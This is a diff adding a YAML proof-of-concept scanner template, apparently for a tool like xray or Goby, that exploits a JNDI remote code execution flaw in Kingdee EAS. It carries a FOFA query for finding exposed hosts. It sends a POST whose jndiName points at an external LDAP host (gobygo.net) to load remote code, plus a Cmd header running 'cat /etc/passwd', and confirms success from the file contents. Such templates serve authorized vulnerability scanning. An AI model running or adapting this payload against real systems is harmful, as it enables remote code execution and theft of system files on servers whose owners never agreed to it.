@@ -1,0 +1,21 @@
+id: poc-yaml-kingdee-eas-createdatasource-jndi-rce
+info:
+  name: 金蝶 EAS createdatasource jndi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 金蝶 EAS
+  fofa: app="Kingdee-EAS"
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /appmonitor//protect/datasource/createDataSource
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cmd: cat /etc/passwd
+    Referer: https://{{.host}}
+  data: name={{.t1}}&jndiName=ldap://gobygo.net/A7&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=asdasxasx&userName=asdasxasx&password=asdasxasx&repassword=asdasxasx&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
